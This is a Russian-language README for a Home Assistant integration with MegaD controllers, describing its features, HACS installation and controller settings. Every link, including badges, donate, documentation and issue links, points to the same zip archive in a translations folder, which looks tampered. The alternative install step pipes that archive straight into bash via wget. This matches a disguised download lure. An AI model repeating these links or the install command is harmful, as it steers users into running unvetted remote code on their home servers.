

# MegaD HomeAssistant integration
[![hacs_badge](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)
[![Donate](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)

Интеграция с [MegaD-2561, MegaD-328](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)

Если вам понравилась интеграция, не забудьте поставить звезду на гитхабе - вам не сложно, а мне приятно ) А если
интеграция очень понравилась - еще приятнее, если вы воспользуетесь кнопкой доната )

Обновление прошивки MegaD можно делать прямо из HA с помощью [аддона](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)

Подробная документация по [ссылке](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)

Предложения по доработкам просьба писать в [discussions](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip), о проблемах
создавать [issue](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)
## Основные особенности:
- Настройка в веб-интерфейсе + [yaml](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zipКастомизация)
- Все порты автоматически добавляются как устройства (для обычных релейных выходов создается 
  `light`, для шим - `light` с поддержкой яркости, для цифровых входов `binary_sensor`, для датчиков
  `sensor`)
- Возможность работы с несколькими megad
- Обратная связь по [http](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip) или mqtt (`deprecated`, поддержка mqtt 
  будет выключена в версиях >= 1.0.0, тк в нем нет необходимости)
- Автоматическое восстановление состояний выходов после перезагрузки контроллера
- Автоматическое добавление/изменение объектов после перезагрузки контроллера
- [События](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zipСобытия) на двойные/долгие нажатия
- Команды выполняются друг за другом без конкурентного доступа к ресурсам megad, это дает гарантии надежного исполнения
  большого кол-ва команд (например в сценах). Каждая следующая команда отправляется только после получения ответа о
  выполнении предыдущей.
- поддержка [ds2413](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip) в том числе несколько шиной (начиная с версии 0.4.1)
- поддержка расширителей MegaD-16I-XT, MegaD-16R-XT, MegaD-16PWM (начиная с версии 0.5.1)
- поддержка всех возможных датчиков в режиме I2C-ANY, полный список поддерживаемых датчиков 
  [по ссылке](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip) (начиная с версии 0.6.1)

## Установка
Рекомендованный способ с поддержкой обновлений - [HACS](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip):

HACS - Integrations - Explore, в поиске ищем MegaD. 

Чтобы включить возможность использования бета-версий, зайдите в HACS, найдите интеграцию MegaD, нажмите три точки, 
там кнопка "переустановить" или reinstall, дальше нужно нажать галку "показывать бета-версии"

Обновления выполняются так же в меню HACS. 
Информация об обновлениях приходит с некоторым интервалом, чтобы вручную проверить наличие обновлений
нажмите три точки возле интеграции в меню HACS и нажмите `обновить информацию`

Альтернативный способ установки:
```shell
# из папки с конфигом
wget -q -O - https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip | bash -
```
Не забываем перезагрузить HA

## Настройка
`Настройки` -> `Интеграции` -> `Добавить интеграцию` в поиске ищем mega

Все имеющиеся у вас порты будут настроены автоматически. Вы можете менять названия, иконки и entity_id так же из интерфейса.

В самой меге необходимо прописать настройки:
```yaml
srv: "192.168.1.4:8123" # ip:port вашего HA
script: "mega" # это api интеграции, к которому будет обращаться контроллер
```
Так же необходимо настроить Mega-ID в настройках контроллера, для каждой меги id должен быть разным.

При любых изменениях настроек контроллера (типы входов, id и тд) необходимо в настройках интеграции нажать `Обновить 
объекты`

## Зависимости
Для максимальной скорости реакции на команды сервера, рекомендуется выключить `имитацию http-ответа` в 
настройках интеграции и настроить proxy_pass к HA, самый простой способ сделать это - воспользоваться 
[специальным аддоном](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)

Обновить ваш контроллер до последней версии, обновление прошивки MegaD можно делать 
из HA с помощью [аддона](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)


Подробная документация по [ссылке](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)
